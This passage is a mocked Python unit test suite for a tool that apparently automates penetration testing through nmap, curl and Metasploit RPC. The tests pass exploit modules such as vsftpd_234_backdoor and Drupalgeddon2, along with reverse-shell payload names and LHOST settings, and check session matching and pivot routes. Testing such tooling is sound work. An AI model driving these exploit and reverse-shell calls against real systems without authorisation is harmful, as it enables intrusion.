# tests/test_tools.py
"""
Unit tests for core/tools.py.

All external dependencies are mocked:
  - `core.rpc_client.msf_client`  →  patched via `conftest.make_msf_mock()`
  - `subprocess.run`              →  patched per test
  - `socket.socket`               →  patched where LHOST resolution is tested
  - `time.sleep`                  →  always mocked to skip real waits

Tests are pure Python — no Metasploit, no Docker, no network required.
"""
import json
import socket
import subprocess
import sys
from unittest.mock import MagicMock, patch, call
from io import StringIO

import pytest
import core.coder_tools

@pytest.fixture(autouse=True)
def mock_docker_lhost():
    with patch("core.coder_tools._resolve_docker_lhost", return_value=None):
        yield

from tests.conftest import make_msf_mock, NMAP_XML_ONE_HOST, NMAP_XML_EMPTY


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _import_tools_with_msf(msf_mock):
    """
    Import core.tools with msf_client pre-patched.
    Uses importlib so the patch is applied before module-level code runs.
    """
    import importlib
    import core.rpc_client as rpc_mod
    rpc_mod._msf_client_instance = msf_mock
    import core.tools
    importlib.reload(core.tools)
    return core.tools


# ---------------------------------------------------------------------------
# 1. nmap_scan
# ---------------------------------------------------------------------------

class TestNmapScan:

    def _call(self, stdout="", returncode=0, stderr=""):
        """Helper: mock subprocess.run to return a fake nmap result."""
        mock_result = MagicMock()
        mock_result.stdout = stdout
        mock_result.returncode = returncode
        mock_result.stderr = stderr
        return mock_result

    def test_happy_path_parses_open_ports(self):
        """nmap_scan correctly extracts open ports and skips closed ones."""
        from core.tools import nmap_scan
        with patch("subprocess.run", return_value=self._call(stdout=NMAP_XML_ONE_HOST)):
            result = json.loads(nmap_scan("192.168.1.10"))

        assert result["status"] == "success"
        assert len(result["hosts"]) == 1
        host = result["hosts"][0]
        assert host["ip"] == "192.168.1.10"
        # Only open ports should be included (port 21 is closed)
        ports = {p["port"] for p in host["open_ports"]}
        assert ports == {22, 80}
        assert 21 not in ports

    def test_parses_service_fields(self):
        """Service name, product, version and extra_info are correctly parsed."""
        from core.tools import nmap_scan
        with patch("subprocess.run", return_value=self._call(stdout=NMAP_XML_ONE_HOST)):
            result = json.loads(nmap_scan("192.168.1.10"))

        ssh_port = next(p for p in result["hosts"][0]["open_ports"] if p["port"] == 22)
        assert ssh_port["service"] == "ssh"
        assert ssh_port["product"] == "OpenSSH"
        assert ssh_port["version"] == "8.9"
        assert ssh_port["extra_info"] == "Ubuntu"

    def test_parses_os_guesses(self):
        """OS detection entries are parsed and included in the result."""
        from core.tools import nmap_scan
        with patch("subprocess.run", return_value=self._call(stdout=NMAP_XML_ONE_HOST)):
            result = json.loads(nmap_scan("192.168.1.10"))

        os_guesses = result["hosts"][0]["os_guesses"]
        assert len(os_guesses) == 1
        assert os_guesses[0]["name"] == "Linux 5.x"
        assert os_guesses[0]["accuracy"] == "95"

    def test_empty_xml_returns_empty_hosts(self):
        """An nmap XML with no <host> elements yields an empty hosts list."""
        from core.tools import nmap_scan
        with patch("subprocess.run", return_value=self._call(stdout=NMAP_XML_EMPTY)):
            result = json.loads(nmap_scan("192.168.1.99"))

        assert result["status"] == "success"
        assert result["hosts"] == []

    def test_subprocess_error_returns_error(self):
        """Non-zero return code from docker/nmap returns an error status."""
        from core.tools import nmap_scan
        with patch("subprocess.run", return_value=self._call(returncode=1, stderr="permission denied")):
            result = json.loads(nmap_scan("192.168.1.10"))

        assert result["status"] == "error"
        assert "permission denied" in result["message"]

    def test_timeout_returns_error(self):
        """subprocess.TimeoutExpired is caught and reported as an error."""
        from core.tools import nmap_scan
        with patch("subprocess.run", side_effect=subprocess.TimeoutExpired(cmd="nmap", timeout=180)):
            result = json.loads(nmap_scan("192.168.1.10"))

        assert result["status"] == "error"
        assert "timeout" in result["message"].lower()

    def test_docker_not_found_returns_error(self):
        """FileNotFoundError (docker not in PATH) is caught gracefully."""
        from core.tools import nmap_scan
        with patch("subprocess.run", side_effect=FileNotFoundError()):
            result = json.loads(nmap_scan("192.168.1.10"))

        assert result["status"] == "error"
        assert "docker" in result["message"].lower()

    def test_custom_ports_and_arguments_forwarded(self):
        """Custom port ranges and arguments are passed to the subprocess call."""
        from core.tools import nmap_scan
        with patch("subprocess.run", return_value=self._call(stdout=NMAP_XML_EMPTY)) as mock_run:
            nmap_scan("10.0.0.1", ports="80,443", arguments="-sV -A")
            cmd = mock_run.call_args[0][0]

        assert "-p" in cmd
        assert "80,443" in cmd
        assert "-sV" in cmd
        assert "-A" in cmd
        # --open must always be present (hardcoded)
        assert "--open" in cmd

    def test_broken_xml_returns_parse_error(self):
        """Malformed XML output from nmap is caught and reported."""
        from core.tools import nmap_scan
        with patch("subprocess.run", return_value=self._call(stdout="NOT VALID XML<<<")):
            result = json.loads(nmap_scan("192.168.1.10"))

        assert result["status"] == "error"
        assert "parse" in result["message"].lower() or "xml" in result["message"].lower()


# ---------------------------------------------------------------------------
# 2. curl_request
# ---------------------------------------------------------------------------

class TestCurlRequest:

    HTTP_RESPONSE = (
        "HTTP/1.1 200 OK\r\n"
        "Server: Apache/2.4.52\r\n"
        "Content-Type: text/html\r\n"
        "\r\n"
        "<html>Hello World</html>"
    )

    HTTP_RESPONSE_LF = (
        "HTTP/1.1 301 Moved Permanently\n"
        "Location: https://example.com/\n"
        "\n"
        ""
    )

    def _mock_run(self, stdout, returncode=0, stderr=""):
        m = MagicMock()
        m.stdout = stdout
        m.returncode = returncode
        m.stderr = stderr
        return m

    def test_happy_path_parses_status_and_headers(self):
        """Status line and response headers are correctly parsed from CRLF response."""
        from core.tools import curl_request
        with patch("subprocess.run", return_value=self._mock_run(self.HTTP_RESPONSE)):
            result = json.loads(curl_request("http://192.168.1.10/"))

        assert result["status"] == "success"
        assert result["status_line"] == "HTTP/1.1 200 OK"
        assert result["response_headers"]["Server"] == "Apache/2.4.52"
        assert result["response_headers"]["Content-Type"] == "text/html"

    def test_body_extracted_correctly(self):
        """The response body is extracted after the blank line separator."""
        from core.tools import curl_request
        with patch("subprocess.run", return_value=self._mock_run(self.HTTP_RESPONSE)):
            result = json.loads(curl_request("http://192.168.1.10/"))

        assert "<html>Hello World</html>" in result["body_preview"]

    def test_lf_separator_also_works(self):
        """Responses using LF-only separators are handled correctly."""
        from core.tools import curl_request
        with patch("subprocess.run", return_value=self._mock_run(self.HTTP_RESPONSE_LF)):
            result = json.loads(curl_request("http://192.168.1.10/"))

        assert result["status"] == "success"
        assert result["status_line"] == "HTTP/1.1 301 Moved Permanently"

    def test_body_truncated_at_4096_chars(self):
        """Bodies longer than 4096 characters are truncated and flagged."""
        from core.tools import curl_request
        long_body = "X" * 5000
        response = f"HTTP/1.1 200 OK\r\n\r\n{long_body}"
        with patch("subprocess.run", return_value=self._mock_run(response)):
            result = json.loads(curl_request("http://192.168.1.10/"))

        assert result["body_truncated"] is True
        assert len(result["body_preview"]) == 4096

    def test_body_not_truncated_when_short(self):
        """Bodies shorter than 4096 characters are not flagged as truncated."""
        from core.tools import curl_request
        with patch("subprocess.run", return_value=self._mock_run(self.HTTP_RESPONSE)):
            result = json.loads(curl_request("http://192.168.1.10/"))

        assert result["body_truncated"] is False

    def test_timeout_error_handled(self):
        """TimeoutExpired from curl is caught and returned as error."""
        from core.tools import curl_request
        with patch("subprocess.run", side_effect=subprocess.TimeoutExpired(cmd="curl", timeout=15)):
            result = json.loads(curl_request("http://192.168.1.10/"))

        assert result["status"] == "error"
        assert "timed out" in result["message"].lower()

    def test_curl_not_found_handled(self):
        """FileNotFoundError (curl missing) is caught gracefully."""
        from core.tools import curl_request
        with patch("subprocess.run", side_effect=FileNotFoundError()):
            result = json.loads(curl_request("http://192.168.1.10/"))

        assert result["status"] == "error"
        assert "curl" in result["message"].lower()

    def test_custom_headers_forwarded(self):
        """Custom headers are appended as -H arguments in the curl command."""
        from core.tools import curl_request
        with patch("subprocess.run", return_value=self._mock_run(self.HTTP_RESPONSE)) as mock_run:
            curl_request("http://10.0.0.1/", headers={"X-Custom": "TestValue"})
            cmd = mock_run.call_args[0][0]

        assert "-H" in cmd
        assert any("X-Custom: TestValue" in arg for arg in cmd)

    def test_post_with_data_forwarded(self):
        """POST method and data body are forwarded to the curl command."""
        from core.tools import curl_request
        with patch("subprocess.run", return_value=self._mock_run(self.HTTP_RESPONSE)) as mock_run:
            curl_request("http://10.0.0.1/login", method="POST", data="user=admin&pass=x")
            cmd = mock_run.call_args[0][0]

        assert "-X" in cmd
        assert "POST" in cmd
        assert "--data" in cmd

    def test_insecure_flag_added(self):
        """insecure=True appends -k to the curl command."""
        from core.tools import curl_request
        with patch("subprocess.run", return_value=self._mock_run(self.HTTP_RESPONSE)) as mock_run:
            curl_request("https://10.0.0.1/", insecure=True)
            cmd = mock_run.call_args[0][0]

        assert "-k" in cmd


# ---------------------------------------------------------------------------
# 3. msf_execute_scanner
# ---------------------------------------------------------------------------

class TestMsfExecuteScanner:

    def test_rejects_non_auxiliary_module(self):
        """Guard: exploit/ and post/ paths are rejected before calling MSF."""
        from core.tools import msf_execute_scanner
        for bad_path in ["exploit/unix/ftp/vsftpd_234_backdoor", "post/multi/manage/shell_to_meterpreter"]:
            result = json.loads(msf_execute_scanner(bad_path, "192.168.1.10", 21))
            assert result["status"] == "error"
            assert "auxiliary/" in result["message"]

    def test_nonexistent_module_returns_error_and_suggestions(self):
        """When an invalid module is passed, returns error status and matching suggestions."""
        msf = make_msf_mock(
            module_info_result={"error": "Invalid Module"},
            module_auxiliary_result={"modules": [
                "scanner/http/dir_scanner",
                "scanner/http/apache_mod_cgi_bash_env",
                "scanner/http/cgit_traversal",
                "scanner/portscan/tcp"
            ]}
        )
        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                result = json.loads(tools.msf_execute_scanner(
                    "auxiliary/scanner/http/cgi", "192.168.1.10", 80
                ))

        assert result["status"] == "error"
        assert "does not exist in Metasploit" in result["message"]
        assert "suggested_scanners" in result
        assert "auxiliary/scanner/http/apache_mod_cgi_bash_env" in result["suggested_scanners"]

    @patch("time.sleep")
    def test_happy_path_returns_success(self, mock_sleep):
        """Valid auxiliary module returns success with console_output and open_ports."""
        msf = make_msf_mock(session_list_result={})
        console_output = (
            "RHOSTS => 192.168.1.10\nPORTS => 80\n"
            "[+] 192.168.1.10:          - 192.168.1.10:80 - TCP OPEN\n"
            "[*] 192.168.1.10:          - Scanned 1 of 1 hosts (100% complete)\n"
            "[*] Auxiliary module execution completed\n"
        )
        read_count = 0
        def custom_call(method, *args, **kwargs):
            nonlocal read_count
            if method == "console.create":
                return {"id": "42"}
            if method == "console.write":
                return {"wrote": 10}
            if method == "console.read":
                read_count += 1
                if read_count == 1:
                    return {"data": console_output, "busy": False}
                return {"data": "", "busy": False}
            if method == "console.destroy":
                return {"result": "success"}
            return {}
        msf.call.side_effect = custom_call

        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                result = json.loads(tools.msf_execute_scanner(
                    "auxiliary/scanner/portscan/tcp", "192.168.1.10", 80
                ))

        assert result["status"] == "success"
        assert "console_output" in result
        assert "open_ports" in result
        assert any(p["port"] == 80 for p in result["open_ports"])

    @patch("time.sleep")
    def test_rpc_error_returned_as_error(self, mock_sleep):
        """console.create failure is propagated as an error status."""
        msf = make_msf_mock()
        def custom_call(method, *args, **kwargs):
            if method == "console.create":
                return {"error": "Console creation failed"}
            return {}
        msf.call.side_effect = custom_call
        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                result = json.loads(tools.msf_execute_scanner(
                    "auxiliary/scanner/http/http_version", "192.168.1.10", 80
                ))

        assert result["status"] == "error"

    @patch("time.sleep")
    def test_rpc_boolean_error_expanded(self, mock_sleep):
        """Exception during console operations is caught and returned as error."""
        msf = make_msf_mock()
        def custom_call(method, *args, **kwargs):
            if method == "console.create":
                raise RuntimeError("Connection refused")
            return {}
        msf.call.side_effect = custom_call
        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                result = json.loads(tools.msf_execute_scanner(
                    "auxiliary/scanner/portscan/tcp", "192.168.1.10", 80
                ))

        assert result["status"] == "error"
        assert len(result["message"]) > 5

    @patch("time.sleep")
    def test_accepts_string_port_range(self, mock_sleep):
        """msf_execute_scanner should accept a string for rport (e.g., '1-1000') and pass it in the console command."""
        msf = make_msf_mock()
        written_cmd = []
        def custom_call(method, *args, **kwargs):
            if method == "console.create":
                return {"id": "1"}
            if method == "console.write":
                written_cmd.append(args[1] if len(args) > 1 else "")
                return {"wrote": 10}
            if method == "console.read":
                return {"data": "[*] Auxiliary module execution completed\n", "busy": False}
            if method == "console.destroy":
                return {"result": "success"}
            return {}
        msf.call.side_effect = custom_call

        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                result = json.loads(tools.msf_execute_scanner(
                    "auxiliary/scanner/portscan/tcp", "192.168.1.10", "1-1000"
                ))

        assert result["status"] == "success"
        # Verify that the port range was sent in the console command
        assert any("1-1000" in cmd for cmd in written_cmd)

    def test_extra_options_forwarded(self):
        """msf_execute_scanner forwards extra_options key-values to console commands."""
        msf = make_msf_mock()
        written_cmd = []
        def custom_call(method, *args, **kwargs):
            if method == "console.create":
                return {"id": "1"}
            if method == "console.write":
                written_cmd.append(args[1] if len(args) > 1 else "")
                return {"wrote": 10}
            if method == "console.read":
                return {"data": "[*] Auxiliary module execution completed\n", "busy": False}
            if method == "console.destroy":
                return {"result": "success"}
            return {}
        msf.call.side_effect = custom_call

        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                result = json.loads(tools.msf_execute_scanner(
                    "auxiliary/scanner/http/apache_mod_cgi_bash_env",
                    "172.32.4.20",
                    80,
                    extra_options={"TARGETURI": "/cgi-bin/vulnerable"}
                ))

        assert result["status"] == "success"
        assert any("set TARGETURI /cgi-bin/vulnerable" in cmd for cmd in written_cmd)

    @patch("time.sleep")
    def test_polling_active_job_loops_until_done(self, mock_sleep):
        """msf_execute_scanner polls console.read until busy=False and completion marker seen."""
        msf = make_msf_mock()
        read_count = 0
        def custom_call(method, *args, **kwargs):
            nonlocal read_count
            if method == "console.create":
                return {"id": "1"}
            if method == "console.write":
                return {"wrote": 10}
            if method == "console.read":
                read_count += 1
                if read_count < 3:
                    return {"data": "[*] Running...\n", "busy": True}
                return {"data": "[*] Auxiliary module execution completed\n", "busy": False}
            if method == "console.destroy":
                return {"result": "success"}
            return {}
        msf.call.side_effect = custom_call

        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                result = json.loads(tools.msf_execute_scanner(
                    "auxiliary/scanner/portscan/tcp", "192.168.1.10", 80
                ))

        assert result["status"] == "success"
        assert read_count >= 3  # Polled multiple times before completion

    @patch("time.sleep")
    @patch("time.time")
    def test_polling_active_job_timeout_kills_job(self, mock_time, mock_sleep):
        """msf_execute_scanner exits loop and returns partial results when timeout is reached."""
        msf = make_msf_mock()
        # Simulate time: returns increasing values so timeout (>120s) is triggered after 2nd read
        mock_time.side_effect = [100.0, 100.5, 222.0, 222.5, 300.0, 300.5, 400.0, 400.5, 500.0, 500.5]
        def custom_call(method, *args, **kwargs):
            if method == "console.create":
                return {"id": "1"}
            if method == "console.write":
                return {"wrote": 10}
            if method == "console.read":
                # Never completes
                return {"data": "[*] Still running...\n", "busy": True}
            if method == "console.destroy":
                return {"result": "success"}
            return {}
        msf.call.side_effect = custom_call

        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                result = json.loads(tools.msf_execute_scanner(
                    "auxiliary/scanner/portscan/tcp", "192.168.1.10", 80
                ))

        # Tool should still return success (with whatever output it got)
        assert result["status"] == "success"
        assert result.get("timed_out") is True
        assert "TIMED OUT" in result["info"]
        assert "console_output" in result

    @patch("time.sleep")
    def test_portscan_tuning_and_regex(self, mock_sleep):
        """msf_execute_scanner tunes CONCURRENCY and TIMEOUT for portscan and parses TCP OPEN without prefix."""
        msf = make_msf_mock()
        written_cmd = []
        def custom_call(method, *args, **kwargs):
            if method == "console.create":
                return {"id": "99"}
            if method == "console.write":
                written_cmd.append(args[1] if len(args) > 1 else "")
                return {"wrote": 10}
            if method == "console.read":
                output = (
                    "PORTS => 1-10000\n"
                    "CONCURRENCY => 50\n"
                    "TIMEOUT => 300\n"
                    "[+] 10.10.2.4:8888 - TCP OPEN\n"
                    "[*] Auxiliary module execution completed\n"
                )
                return {"data": output, "busy": False}
            if method == "console.destroy":
                return {"result": "success"}
            return {}
        msf.call.side_effect = custom_call

        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                result = json.loads(tools.msf_execute_scanner(
                    "auxiliary/scanner/portscan/tcp", "10.10.2.4", "1-10000"
                ))

        assert result["status"] == "success"
        assert result.get("timed_out") is False
        assert any(p["port"] == 8888 and p["host"] == "10.10.2.4" for p in result["open_ports"])
        # Check tuning options were sent
        cmd_str = "".join(written_cmd)
        assert "set CONCURRENCY 50" in cmd_str
        assert "set TIMEOUT 300" in cmd_str
        assert "set PORTS 1-10000" in cmd_str
        assert "set RPORT" not in cmd_str
        assert "set SRVHOST" not in cmd_str

    def test_missing_pivot_route_returns_route_not_present(self):
        """When an internal pivot target has no active route in Metasploit, return 'route not present' error."""
        with patch("core.coder_tools._check_target_pivot_status", return_value=(False, "route not present: Target '10.10.2.4' is on internal subnet '10.10.2.0/24', but no active Metasploit session is currently routing it.")):
            from core import tools
            result = json.loads(tools.msf_execute_scanner(
                "auxiliary/scanner/portscan/tcp", "10.10.2.4", "1-10000"
            ))

        assert result["status"] == "error"
        assert "route not present" in result["message"]
        assert result["open_ports"] == []


# ---------------------------------------------------------------------------
# 4. msf_trigger_exploit
# ---------------------------------------------------------------------------

class TestMsfTriggerExploit:

    def test_rejects_non_exploit_module(self):
        """Guard: auxiliary/ and post/ paths are rejected before calling MSF."""
        from core.tools import msf_trigger_exploit
        for bad in ["auxiliary/scanner/portscan/tcp", "post/multi/manage/shell_to_meterpreter"]:
            result = json.loads(msf_trigger_exploit(bad, "192.168.1.10", 21, "generic/shell_reverse_tcp"))
            assert result["status"] == "error"
            assert "exploit/" in result["message"]

    @patch("time.sleep")
    def test_happy_path_returns_session_id(self, mock_sleep):
        """Successful exploit returns status:success and a session_id."""
        sessions = {
            "1": {"type": "shell", "tunnel_local": "127.0.0.1:4444", "tunnel_peer": "192.168.1.10:43210"}
        }
        msf = make_msf_mock(module_execute_result={"job_id": 5})
        
        session_list_calls = 0
        def call_side_effect(method, *args, **kwargs):
            nonlocal session_list_calls
            if method == "session.list":
                session_list_calls += 1
                if session_list_calls == 1:
                    return {}
                return sessions
            if method == "module.execute":
                return {"job_id": 5}
            if method == "session.shell_read":
                return {"data": "active"}
            return {}
        msf.call.side_effect = call_side_effect

        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                result = json.loads(tools.msf_trigger_exploit(
                    "exploit/unix/ftp/vsftpd_234_backdoor",
                    "192.168.1.10", 21,
                    "generic/shell_reverse_tcp",
                    lhost="192.168.1.1"
                ))

        assert result["status"] == "success"
        assert "session_id" in result
        assert result["session_id"] == "1"

    @patch("time.sleep")
    def test_no_session_returns_failed(self, mock_sleep):
        """When exploit runs but no session opens, status is 'failed' with a hint."""
        msf = make_msf_mock(
            module_execute_result={"job_id": 5},
            session_list_result={}  # no sessions
        )
        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                result = json.loads(tools.msf_trigger_exploit(
                    "exploit/unix/ftp/vsftpd_234_backdoor",
                    "192.168.1.10", 21,
                    "generic/shell_reverse_tcp",
                    lhost="192.168.1.1"
                ))

        assert result["status"] == "failed"
        assert "hint" in result

    @patch("time.sleep")
    def test_picks_newest_session_when_multiple(self, mock_sleep):
        """When multiple sessions exist, the one with the highest ID is returned."""
        pre_sessions = {
            "1": {"type": "shell", "session_host": "192.168.1.10"},
            "2": {"type": "shell", "session_host": "192.168.1.10"},
        }
        post_sessions = {
            "1": {"type": "shell", "session_host": "192.168.1.10"},
            "3": {"type": "meterpreter", "session_host": "192.168.1.10"},
            "2": {"type": "shell", "session_host": "192.168.1.10"},
        }
        msf = make_msf_mock(module_execute_result={"job_id": 7})
        
        session_list_calls = 0
        def call_side_effect(method, *args, **kwargs):
            nonlocal session_list_calls
            if method == "session.list":
                session_list_calls += 1
                if session_list_calls == 1:
                    return pre_sessions
                return post_sessions
            if method == "module.execute":
                return {"job_id": 7}
            if method == "session.meterpreter_read":
                return {"data": "active"}
            return {}
        msf.call.side_effect = call_side_effect

        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                result = json.loads(tools.msf_trigger_exploit(
                    "exploit/multi/handler",
                    "192.168.1.10", 4444,
                    "generic/shell_reverse_tcp",
                    lhost="192.168.1.1"
                ))

        assert result["status"] == "success"
        assert result["session_id"] == "3"

    @patch("time.sleep")
    def test_lhost_auto_resolved_when_not_provided(self, mock_sleep):
        """When lhost is None, tool resolves it via socket routing."""
        sessions = {"1": {"type": "shell", "session_host": "192.168.1.10"}}
        msf = make_msf_mock(module_execute_result={"job_id": 1})
        
        session_list_calls = 0
        def call_side_effect(method, *args, **kwargs):
            nonlocal session_list_calls
            if method == "session.list":
                session_list_calls += 1
                if session_list_calls == 1:
                    return {}
                return sessions
            if method == "module.execute":
                return {"job_id": 1}
            if method == "session.shell_read":
                return {"data": "active"}
            return {}
        msf.call.side_effect = call_side_effect

        mock_sock = MagicMock()
        mock_sock.getsockname.return_value = ("10.10.10.1", 0)

        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                with patch("socket.socket", return_value=mock_sock):
                    result = json.loads(tools.msf_trigger_exploit(
                        "exploit/unix/ftp/vsftpd_234_backdoor",
                        "192.168.1.10", 21,
                        "generic/shell_reverse_tcp"
                        # lhost intentionally omitted
                    ))

        assert result["status"] == "success"
        assert result["used_lhost"] == "10.10.10.1"

    @patch("time.sleep")
    def test_exploit_fails_and_unrelated_old_session_exists(self, mock_sleep):
        """When exploit fails to open a session, but an old unrelated session exists, it returns failed."""
        old_sessions = {
            "1": {"type": "shell", "tunnel_local": "127.0.0.1:4444", "tunnel_peer": "192.168.1.200:43210"}
        }
        msf = make_msf_mock(module_execute_result={"job_id": 5})
        
        session_list_calls = 0
        def call_side_effect(method, *args, **kwargs):
            nonlocal session_list_calls
            if method == "session.list":
                session_list_calls += 1
                # The session list doesn't change because exploit failed
                return old_sessions
            if method == "module.execute":
                return {"job_id": 5}
            return {}
        msf.call.side_effect = call_side_effect

        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                result = json.loads(tools.msf_trigger_exploit(
                    "exploit/unix/ftp/vsftpd_234_backdoor",
                    "192.168.1.10", 21,
                    "generic/shell_reverse_tcp",
                    lhost="192.168.1.1"
                ))

        assert result["status"] == "failed"
        assert "no active session" in result["stderr"]

    @patch("time.sleep")
    def test_exploit_opens_session_for_wrong_host(self, mock_sleep):
        """When a new session is opened but it belongs to a different target, it is not returned."""
        pre_sessions = {}
        post_sessions = {
            "1": {"type": "shell", "tunnel_local": "127.0.0.1:4444", "tunnel_peer": "192.168.1.200:43210"}
        }
        msf = make_msf_mock(module_execute_result={"job_id": 5})
        
        session_list_calls = 0
        def call_side_effect(method, *args, **kwargs):
            nonlocal session_list_calls
            if method == "session.list":
                session_list_calls += 1
                if session_list_calls == 1:
                    return pre_sessions
                return post_sessions
            if method == "module.execute":
                return {"job_id": 5}
            return {}
        msf.call.side_effect = call_side_effect

        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                result = json.loads(tools.msf_trigger_exploit(
                    "exploit/unix/ftp/vsftpd_234_backdoor",
                    "192.168.1.10", 21,
                    "generic/shell_reverse_tcp",
                    lhost="192.168.1.1"
                ))

        assert result["status"] == "failed"
        assert "no active session" in result["stderr"]

    @patch("time.sleep")
    def test_exploit_cidr_target_matching(self, mock_sleep):
        """When a target is defined as a CIDR, a new session with an IP in that CIDR is correctly matched."""
        pre_sessions = {}
        post_sessions = {
            "1": {"type": "shell", "session_host": "192.168.1.15"}
        }
        msf = make_msf_mock(module_execute_result={"job_id": 5})
        
        session_list_calls = 0
        def call_side_effect(method, *args, **kwargs):
            nonlocal session_list_calls
            if method == "session.list":
                session_list_calls += 1
                if session_list_calls == 1:
                    return pre_sessions
                return post_sessions
            if method == "module.execute":
                return {"job_id": 5}
            if method == "session.shell_read":
                return {"data": "active"}
            return {}
        msf.call.side_effect = call_side_effect

        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                result = json.loads(tools.msf_trigger_exploit(
                    "exploit/unix/ftp/vsftpd_234_backdoor",
                    "192.168.1.0/24", 21,
                    "generic/shell_reverse_tcp",
                    lhost="192.168.1.1"
                ))

        assert result["status"] == "success"
        assert result["session_id"] == "1"

    @patch("time.sleep")
    def test_exploit_range_target_matching(self, mock_sleep):
        """When a target is defined as an IP range, a new session with an IP in that range is correctly matched."""
        pre_sessions = {}
        post_sessions = {
            "1": {"type": "shell", "session_host": "192.168.1.12"}
        }
        msf = make_msf_mock(module_execute_result={"job_id": 5})
        
        session_list_calls = 0
        def call_side_effect(method, *args, **kwargs):
            nonlocal session_list_calls
            if method == "session.list":
                session_list_calls += 1
                if session_list_calls == 1:
                    return pre_sessions
                return post_sessions
            if method == "module.execute":
                return {"job_id": 5}
            if method == "session.shell_read":
                return {"data": "active"}
            return {}
        msf.call.side_effect = call_side_effect

        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                result = json.loads(tools.msf_trigger_exploit(
                    "exploit/unix/ftp/vsftpd_234_backdoor",
                    "192.168.1.10-20", 21,
                    "generic/shell_reverse_tcp",
                    lhost="192.168.1.1"
                ))

        assert result["status"] == "success"
        assert result["session_id"] == "1"

    @patch("time.sleep")
    def test_exploit_loopback_target_lenience(self, mock_sleep):
        """When target is localhost, a new session with a private IP (e.g. Docker container) is matched under lenience."""
        pre_sessions = {}
        post_sessions = {
            "1": {"type": "shell", "session_host": "172.17.0.4"}
        }
        msf = make_msf_mock(module_execute_result={"job_id": 5})
        
        session_list_calls = 0
        def call_side_effect(method, *args, **kwargs):
            nonlocal session_list_calls
            if method == "session.list":
                session_list_calls += 1
                if session_list_calls == 1:
                    return pre_sessions
                return post_sessions
            if method == "module.execute":
                return {"job_id": 5}
            if method == "session.shell_read":
                return {"data": "active"}
            return {}
        msf.call.side_effect = call_side_effect

        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                result = json.loads(tools.msf_trigger_exploit(
                    "exploit/unix/ftp/vsftpd_234_backdoor",
                    "127.0.0.1", 21,
                    "generic/shell_reverse_tcp",
                    lhost="127.0.0.1"
                ))

        assert result["status"] == "success"
        assert result["session_id"] == "1"

    @patch("time.sleep")
    def test_exploit_via_exploit_fallback(self, mock_sleep):
        """When IP matching fails, but via_exploit matches module_path and target/session are private, fallback matches."""
        pre_sessions = {}
        post_sessions = {
            "1": {"type": "shell", "session_host": "172.17.0.4", "via_exploit": "exploit/unix/ftp/vsftpd_234_backdoor"}
        }
        msf = make_msf_mock(module_execute_result={"job_id": 5})
        
        session_list_calls = 0
        def call_side_effect(method, *args, **kwargs):
            nonlocal session_list_calls
            if method == "session.list":
                session_list_calls += 1
                if session_list_calls == 1:
                    return pre_sessions
                return post_sessions
            if method == "module.execute":
                return {"job_id": 5}
            if method == "session.shell_read":
                return {"data": "active"}
            return {}
        msf.call.side_effect = call_side_effect

        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                result = json.loads(tools.msf_trigger_exploit(
                    "exploit/unix/ftp/vsftpd_234_backdoor",
                    "192.168.1.10", 21,
                    "generic/shell_reverse_tcp",
                    lhost="192.168.1.1"
                ))

        assert result["status"] == "success"
        assert result["session_id"] == "1"

    @patch("time.sleep")
    def test_incompatible_payloads_return_failed(self, mock_sleep):
        """When an incompatible or failing payload is used, it returns failed status with the connection hint."""
        msf = make_msf_mock(
            module_execute_result={"job_id": 99},
            session_list_result={}  # no sessions created
        )
        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                for bad_payload in ["php/reverse_tcp", "generic/shell_reverse_tcp", "php/shell_reverse_tcp"]:
                    result = json.loads(tools.msf_trigger_exploit(
                        "exploit/unix/webapp/drupal_drupalgeddon2",
                        "172.17.0.4", 80,
                        bad_payload,
                        lhost="172.17.0.1"
                    ))
                    assert result["status"] == "failed"
                    assert "no active session" in result["stderr"] or "Exploit triggered but no active session" in result["stderr"]
                    assert "hint" in result
                    assert "generic/shell_reverse_tcp" in result["hint"]


# ---------------------------------------------------------------------------
# 4b. msf_get_module_info
# ---------------------------------------------------------------------------

class TestMsfGetModuleInfo:

    def test_rejects_non_exploit_module(self):
        """Guard: auxiliary/ or non-exploit modules are rejected immediately."""
        from core.coder_tools import msf_get_module_info
        for bad in ["auxiliary/scanner/http/dir_scanner", "post/multi/gather/env", "payload/linux/x64/shell_reverse_tcp"]:
            result = json.loads(msf_get_module_info(bad))
            assert result["status"] == "error"
            assert "only exploit/" in result["message"]

    def test_happy_path_returns_clean_metadata(self):
        """Successful RPC call parses options, references, and targets cleanly."""
        mock_info = {
            "name": "Drupal Drupalgeddon 2 Forms API Property Injection",
            "rank": "excellent",
